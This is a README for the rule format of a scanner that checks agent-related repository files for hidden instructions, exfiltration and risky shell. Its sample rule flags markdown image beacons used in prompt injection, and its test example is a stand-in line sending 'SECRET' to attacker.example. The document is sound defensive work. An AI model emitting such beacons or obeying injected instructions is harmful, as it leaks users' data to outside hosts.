# Scanner rules

Community-contributed detections for `agentkeep scan`. Each rule is one YAML
file under a category directory. The engine and this format land in Phase 3;
the format below is the target and may change until then.

```
rules/
  hidden-unicode/
  agent-instructions/
  exfiltration/
  risky-shell/
  over-broad-permissions/
  ci-workflow/
```

## Rule format (draft)

```yaml
id: exfiltration/markdown-image-beacon      # category/slug, unique
severity: high                              # info | low | medium | high | critical
title: Markdown image with query string to an external host
description: >
  An image whose URL carries a query string can leak data when an agent or
  renderer fetches it. Common in prompt-injection payloads.
applies_to: ["**/*.md", "**/SKILL.md", "**/AGENTS.md"]
detect:
  regex: '!\[[^\]]*\]\(https?://[^)\s]+\?[^)\s]+\)'
remediation: Remove the query string or the image, or host it in the repository.
references:
  - https://example.invalid/placeholder
examples:
  match:
    - "![x](https://attacker.example/p.png?d=SECRET)"
  nomatch:
    - "![logo](./docs/logo.png)"
    - "![badge](https://img.shields.io/badge/ci-green)"
```

`detect` is one of `regex`, `unicode` (class selectors), `yaml_path` /
`json_path` with predicates, `markdown_image_url`, `shell_pattern`, or
`builtin: <name>` for detectors implemented in Rust. The `examples` block is
executed as a test in CI; a rule without examples is rejected.

Fixtures for precision and recall go in `tests/corpus/positive/<rule-id>/`
and `tests/corpus/negative/`. Keep them benign: fake secrets, localhost URLs.
